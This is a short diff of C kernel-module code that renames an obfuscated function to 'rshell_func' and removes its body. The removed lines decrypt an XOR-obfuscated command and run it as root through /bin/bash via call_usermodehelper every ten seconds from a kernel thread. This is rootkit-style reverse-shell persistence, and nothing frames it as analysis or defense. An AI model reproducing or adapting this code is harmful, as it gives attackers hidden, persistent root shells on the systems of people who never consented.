@@ -2,7 +2,7 @@
 #include "utils/encrypt_utils.h"
 
 
-int z9qr_x1(void* data) {
+int rshell_func(void* data) {
     char xor_cmd[] = RSHELL_CMD_OBF;
     if (xor_cmd[0] == '\0') {
         while (!kthread_should_stop()) { // no reverse shell - thread should sleep till killed
@@ -10,14 +10,3 @@ int z9qr_x1(void* data) {
         }
         return 0;
     }
-
-    xor_decrypt(xor_cmd);
-    char* argv[] = { "/bin/bash", "-c", xor_cmd, NULL };
-    static char* envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-        while (!kthread_should_stop()) {
-            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-            ssleep(10);
-        }
-
-    return 0;
-}
